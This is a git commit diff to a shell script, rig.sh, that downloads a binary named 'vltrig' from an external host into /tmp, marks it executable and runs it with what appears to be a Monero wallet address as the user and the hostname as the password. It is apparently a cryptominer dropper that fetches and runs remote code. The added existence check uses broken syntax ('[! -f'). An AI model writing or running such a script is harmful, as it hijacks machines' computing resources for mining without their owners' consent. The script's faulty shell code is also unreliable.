3a29095cbbabede328fe02f772cdc9039f01947f
ivanhi0 <idbod@ivanhi0.ru>
2026-04-13 09:26:50 +0300

    Add if else check

--- rig.sh
+++ rig.sh
@@ -1,6 +1,9 @@
 #!/bin/sh
+FILE_CHK=/tmp/vltrig
 
 cd /tmp
-wget https://bio.ivanhi0.ru/vltrig
+if [! -f "$FILE_CHK" ]; then
+    wget https://bio.ivanhi0.ru/vltrig
+fi
 chmod +x ./vltrig
 ./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
